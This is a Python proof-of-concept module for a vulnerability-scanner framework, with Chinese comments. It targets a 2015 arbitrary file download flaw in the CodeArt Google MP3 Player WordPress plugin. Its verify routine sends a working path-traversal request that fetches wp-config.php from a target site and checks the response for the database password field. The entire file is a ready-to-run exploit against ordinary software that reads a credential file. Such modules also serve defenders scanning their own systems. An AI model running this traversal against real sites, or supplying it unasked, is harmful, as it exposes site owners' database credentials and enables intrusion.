# coding: utf-8
import re
import urllib2

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'WordPress_0112' # 平台漏洞编号，留空
    name = 'Wordpress CodeArt Google MP3 Player Plugin <=1.0.11 /direct_download.php 任意文件下载' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2015-03-02'  # 漏洞公布时间
    desc = '''
    Wordpress CodeArt Google MP3 Player Plugin has file download in do/direct_download.php.
    ''' # 漏洞描述
    ref = 'http://www.exploit-db.com/exploits/35460/' # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Wordpress'  # 漏洞应用名称
    product_version = 'Wordpress CodeArt Google MP3 Player Plugin <=1.0.11'


class Poc(ABPoc):
    poc_id = '2def5f20-c6ef-44ca-991a-e16e385ff866' # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
    
    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                    target=self.target, vuln=self.vuln))
            payload = 'file=../../../wp-config.php'
            path = '/wp-content/plugins/google-mp3-audio-player/direct_download.php?'
            verify_url = self.target + path + payload
            request = urllib2.Request(verify_url)
            response = urllib2.urlopen(request)
            reg = re.compile("DB_PASSWORD")
            if reg.findall(response.read()):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
            
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()